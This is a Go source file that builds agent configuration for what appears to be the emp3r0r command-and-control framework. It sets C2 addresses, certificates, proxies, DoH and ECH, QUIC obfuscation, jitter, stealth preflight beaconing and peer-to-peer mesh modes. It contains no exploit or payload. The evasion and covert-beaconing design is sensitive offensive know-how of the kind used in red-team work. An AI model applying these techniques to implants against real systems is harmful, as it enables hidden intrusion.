package builder

import (
	"fmt"
	"net/url"
	"os"
	"slices"
	"strconv"
	"strings"

	"github.com/jm33-m0/emp3r0r/core/internal/cc/api/client"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/config"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// c2AddressHost extracts the hostname the server certificate must cover from
// either a bare host or a full http(s) URL.
func c2AddressHost(addr string) string {
	if u, err := url.Parse(addr); err == nil && u.Hostname() != "" {
		return u.Hostname()
	}
	return addr
}

// c2BaseURL returns the URL agents use for the selected channel. An explicit
// URL (including scheme and port) wins; otherwise the host and the channel's
// default port are combined.
func c2BaseURL(addr, scheme, port string) string {
	if u, err := url.Parse(addr); err == nil && u.Scheme != "" && u.Host != "" {
		return strings.TrimSuffix(addr, "/")
	}
	return fmt.Sprintf("%s://%s:%s", scheme, addr, port)
}

// AgentConfig represents the options provided by a user (via CLI, Web UI, API)
// to generate a new agent configuration payload.
type AgentConfig struct {
	CCAddress           *string
	CDNProxy            *string
	C2TransportProxy    *string
	DoHServer           *string
	ECHServerName       *string
	C2ChannelMode       *string
	QUICStandardKey     bool
	IsP2PEnabled        bool
	IsDirectC2          bool
	PersistentRouter    bool
	IsNCSIEnabled       bool
	UseKCP              bool
	IsStager            bool
	P2PTransport        *string
	P2PRelayPort        *string
	MeshGossipPort      *string
	InitialPeers        *[]string
	CCHTTPPort          *string
	PollInterval        *int
	PollWindow          *int
	OfflineGrace        *int
	Jitter              *int
	OperatorIdleTimeout *int
}

// MakeConfig takes the generalized AgentConfig options and orchestrates the
// filling of the JSON payload and generating/updating certificates as required.
func MakeConfig(opts AgentConfig) error {
	// Preflight check is now enabled by default for better stealth
	live.RuntimeConfig.PreflightEnabled = true

	// read existing config when possible
	if util.IsExist(live.EmpConfigFile) {
		logging.Infof("Reading config from existing %s", live.EmpConfigFile)
		jsonData, err := os.ReadFile(live.EmpConfigFile)
		if err != nil {
			return fmt.Errorf("failed to read %s: %v", live.EmpConfigFile, err)
		}
		if err = config.ReadJSONConfig(jsonData, live.RuntimeConfig); err != nil {
			return fmt.Errorf("parsing existing %s: %v", live.EmpConfigFile, err)
		}
	}

	// CC names and certs
	if opts.CCAddress != nil {
		live.RuntimeConfig.CCAddress = *opts.CCAddress
	}
	live.RuntimeConfig.CCAddress = strings.TrimSuffix(live.RuntimeConfig.CCAddress, "/")
	ccHost := c2AddressHost(live.RuntimeConfig.CCAddress)
	logging.Infof("C2 server name: %s", live.RuntimeConfig.CCAddress)
	existingNames := transport.NamesInCert(transport.ServerCrtFile)

	if !slices.Contains(existingNames, ccHost) && ccHost != "" {
		logging.Warningf("Name '%s' is not covered by our server cert, updating it on the C2", ccHost)

		certs, err := client.EnsureCerts([]string{ccHost})
		if err != nil {
			return fmt.Errorf("failed to update C2 certificate for %s: %w", ccHost, err)
		}

		// Save the updated CA/server certificate bundle locally.
		if err := os.WriteFile(transport.CaCrtFile, certs["ca_crt"], 0o644); err != nil {
			return fmt.Errorf("failed to save CA cert: %w", err)
		}
		if err := os.WriteFile(transport.ServerCrtFile, certs["server_crt"], 0o644); err != nil {
			return fmt.Errorf("failed to save Server cert: %w", err)
		}
	}

	// Internet check
	live.RuntimeConfig.EnableNCSI = opts.IsNCSIEnabled
	if live.RuntimeConfig.EnableNCSI {
		logging.Infof("NCSI is enabled")
	}

	// Proxies & Transports
	if opts.CDNProxy != nil {
		live.RuntimeConfig.CDNProxy = *opts.CDNProxy
	}
	if live.RuntimeConfig.CDNProxy != "" {
		logging.Infof("Using CDN proxy %s", live.RuntimeConfig.CDNProxy)
	}

	live.RuntimeConfig.UseKCP = opts.UseKCP
	if live.RuntimeConfig.UseKCP {
		logging.Infof("Using KCP")
	}

	if opts.C2TransportProxy != nil {
		live.RuntimeConfig.C2TransportProxy = *opts.C2TransportProxy
	}
	if live.RuntimeConfig.C2TransportProxy != "" {
		logging.Infof("Using C2 transport proxy %s", live.RuntimeConfig.C2TransportProxy)
	}

	if opts.DoHServer != nil {
		live.RuntimeConfig.DoHServer = *opts.DoHServer
	}
	if live.RuntimeConfig.DoHServer != "" {
		logging.Infof("Using DoH server %s", live.RuntimeConfig.DoHServer)
	}

	if opts.ECHServerName != nil {
		live.RuntimeConfig.ECHServerName = *opts.ECHServerName
	}
	if live.RuntimeConfig.ECHServerName != "" {
		logging.Infof("Using ECH for C2 TLS, fetching the config from the HTTPS RR of %s", live.RuntimeConfig.ECHServerName)
	}

	// HTTP Port
	if opts.CCHTTPPort != nil {
		live.RuntimeConfig.CCHTTPPort = *opts.CCHTTPPort
	}
	if live.RuntimeConfig.CCHTTPPort == "" {
		live.RuntimeConfig.CCHTTPPort = fmt.Sprintf("%v", util.RandInt(1025, 65534))
		logging.Warningf("HTTP port not set, randomized to %s", live.RuntimeConfig.CCHTTPPort)
	}
	logging.Infof("C2 HTTP port: %s", live.RuntimeConfig.CCHTTPPort)

	if opts.C2ChannelMode != nil {
		live.RuntimeConfig.C2ChannelMode = *opts.C2ChannelMode
	}
	if live.RuntimeConfig.C2ChannelMode == "" {
		live.RuntimeConfig.C2ChannelMode = def.C2ChannelModeDefault
	}
	if _, err := transport.GetC2ChannelWrapper(live.RuntimeConfig.C2ChannelMode); err != nil {
		return fmt.Errorf("invalid c2-channel-mode: %s (available: %s)", live.RuntimeConfig.C2ChannelMode, strings.Join(transport.AllC2ChannelModes(), ","))
	}
	// QUIC datagram obfuscation is on by default; the operator can opt out so
	// the agent speaks stock QUIC (interoperable with HTTP/3 endpoints).
	live.RuntimeConfig.QUICStandardKey = opts.QUICStandardKey
	logging.Infof("Using C2 channel mode %s", live.RuntimeConfig.C2ChannelMode)

	if live.RuntimeConfig.PaddingMin == 0 {
		live.RuntimeConfig.PaddingMin = 1024
	}
	if live.RuntimeConfig.PaddingMax == 0 {
		live.RuntimeConfig.PaddingMax = 10240
	}
	transport.SetC2Padding(live.RuntimeConfig.PaddingMin, live.RuntimeConfig.PaddingMax)
	if opts.PollInterval != nil {
		live.RuntimeConfig.PollInterval = *opts.PollInterval
	}
	if live.RuntimeConfig.PollInterval == 0 {
		live.RuntimeConfig.PollInterval = 60
	}
	if opts.PollWindow != nil {
		live.RuntimeConfig.PollWindow = *opts.PollWindow
	}
	if live.RuntimeConfig.PollWindow == 0 {
		live.RuntimeConfig.PollWindow = 5
	}
	if opts.OfflineGrace != nil {
		live.RuntimeConfig.OfflineGrace = *opts.OfflineGrace
	}

	if opts.Jitter != nil {
		live.RuntimeConfig.Jitter = *opts.Jitter
	}
	if live.RuntimeConfig.Jitter == 0 {
		live.RuntimeConfig.Jitter = 20
	}

	if opts.OperatorIdleTimeout != nil {
		live.RuntimeConfig.OperatorIdleTimeout = *opts.OperatorIdleTimeout
	}

	// Preflight / Hybrid Mode intervals. Only the plain-HTTP and QUIC channel
	// modes lack a TLS/TCP C2 endpoint, so preflight is served on the HTTP port
	// for them; every other mode also has the h2 TLS listener.
	plainPreflight := live.RuntimeConfig.C2ChannelMode == def.C2ChannelModePlainHTTP || live.RuntimeConfig.C2ChannelMode == def.C2ChannelModeQUIC
	preflightScheme := "https"
	preflightPort := live.RuntimeConfig.CCH2Port
	if plainPreflight {
		preflightScheme = "http"
		preflightPort = live.RuntimeConfig.CCHTTPPort
	}
	preflightBase := c2BaseURL(live.RuntimeConfig.CCAddress, preflightScheme, preflightPort)
	if live.RuntimeConfig.PreflightURL == "" {
		// generate new if empty
		live.RuntimeConfig.PreflightURL = fmt.Sprintf("%s/%s", strings.TrimSuffix(preflightBase, "/"), util.RandStr(util.RandInt(5, 10)))
	} else if u, err := url.Parse(live.RuntimeConfig.PreflightURL); err == nil {
		// synchronise host and port with CCAddress
		if cc, ccErr := url.Parse(live.RuntimeConfig.CCAddress); ccErr == nil && cc.Scheme != "" && cc.Host != "" {
			u.Scheme = cc.Scheme
			u.Host = cc.Host
		} else {
			u.Scheme = preflightScheme
			u.Host = fmt.Sprintf("%s:%s", live.RuntimeConfig.CCAddress, preflightPort)
		}
		live.RuntimeConfig.PreflightURL = u.String()
	}
	if live.RuntimeConfig.PreflightIntervalMin == 0 {
		live.RuntimeConfig.PreflightIntervalMin = util.RandInt(30, 120)
	}
	if live.RuntimeConfig.PreflightIntervalMax == 0 {
		live.RuntimeConfig.PreflightIntervalMax = live.RuntimeConfig.PreflightIntervalMin + util.RandInt(30, 300)
	}
	logging.Infof("Conditional C2 (Hybrid Mode) beacon interval: %d - %d seconds", live.RuntimeConfig.PreflightIntervalMin, live.RuntimeConfig.PreflightIntervalMax)

	// Mesh / P2P mode
	live.RuntimeConfig.IsP2PEnabled = opts.IsP2PEnabled
	live.RuntimeConfig.IsDirectC2Enabled = opts.IsDirectC2
	live.RuntimeConfig.PersistentRouter = opts.PersistentRouter

	if live.RuntimeConfig.IsP2PEnabled {
		if opts.P2PRelayPort != nil && *opts.P2PRelayPort != "" {
			if p, err := strconv.Atoi(*opts.P2PRelayPort); err != nil || p <= 0 || p > 65535 {
				return fmt.Errorf("invalid p2p-relay-port: %s", *opts.P2PRelayPort)
			}
			live.RuntimeConfig.P2PRelayPort = *opts.P2PRelayPort
		} else {
			live.RuntimeConfig.P2PRelayPort = fmt.Sprintf("%d", util.RandInt(1025, 65534))
		}
		if opts.MeshGossipPort != nil && *opts.MeshGossipPort != "" {
			if p, err := strconv.Atoi(*opts.MeshGossipPort); err != nil || p <= 0 || p > 65535 {
				return fmt.Errorf("invalid mesh-gossip-port: %s", *opts.MeshGossipPort)
			}
			live.RuntimeConfig.MeshGossipPort = *opts.MeshGossipPort
		} else {
			live.RuntimeConfig.MeshGossipPort = fmt.Sprintf("%d", util.RandInt(1025, 65534))
		}
	}

	if opts.P2PTransport != nil {
		isValid := false
		if slices.Contains(transport.AllTransportNames(), *opts.P2PTransport) {
			isValid = true
		}
		if !isValid {
			return fmt.Errorf("invalid p2p-transport: %s (available: %v)", *opts.P2PTransport, transport.AllTransportNames())
		}
		live.RuntimeConfig.P2PTransport = *opts.P2PTransport
	} else if live.RuntimeConfig.P2PTransport == "" {
		live.RuntimeConfig.P2PTransport = transport.DefaultMeshTransport
	}

	// Standalone agents always contact C2 directly.
	if !live.RuntimeConfig.IsP2PEnabled {
		live.RuntimeConfig.IsDirectC2Enabled = true
	}

	// Bootstrap peers for gossip
	if opts.InitialPeers != nil {
		live.RuntimeConfig.InitialPeers = *opts.InitialPeers
	}

	for _, p := range live.RuntimeConfig.InitialPeers {
		if !strings.Contains(p, ":") {
			return fmt.Errorf("invalid peer address %q: --peers entries must be in ip:port format (e.g. --peers 1.2.3.4:7946)", p)
		}
	}

	if live.RuntimeConfig.IsP2PEnabled && !live.RuntimeConfig.IsDirectC2Enabled {
		if len(live.RuntimeConfig.InitialPeers) == 0 {
			return fmt.Errorf("silent Node build requires --peers: specify at least one Gateway IP:port (e.g. --peers 1.2.3.4:7946)")
		}
		logging.Infof("Silent Node bootstrap peers: %v", live.RuntimeConfig.InitialPeers)
	}

	switch {
	case live.RuntimeConfig.IsP2PEnabled && live.RuntimeConfig.IsDirectC2Enabled:
		logging.Infof("Mode: Gateway (P2P mesh + direct C2 + preflight)")
	case live.RuntimeConfig.IsP2PEnabled:
		logging.Infof("Mode: Silent Node (P2P mesh only, no direct C2)")
	default:
		logging.Infof("Mode: Standalone (direct C2, no mesh)")
	}

	live.RuntimeConfig.IsRunByStager = opts.IsStager
	if live.RuntimeConfig.IsRunByStager {
		logging.Infof("Agent is built for stager")
	}

	// A partial/legacy HTTP profile would let the agent and CC disagree on the
	// session carrier, so replace it with a fresh random one when incomplete.
	// MakeConfig persists the result below, so the server keeps using the same
	// profile for the agents built from this run.
	live.RuntimeConfig.MalleableC2 = transport.NormalizeMalleableHTTPConfig(live.RuntimeConfig.MalleableC2)

	// save JSON
	return config.SaveConfigJSON()
}
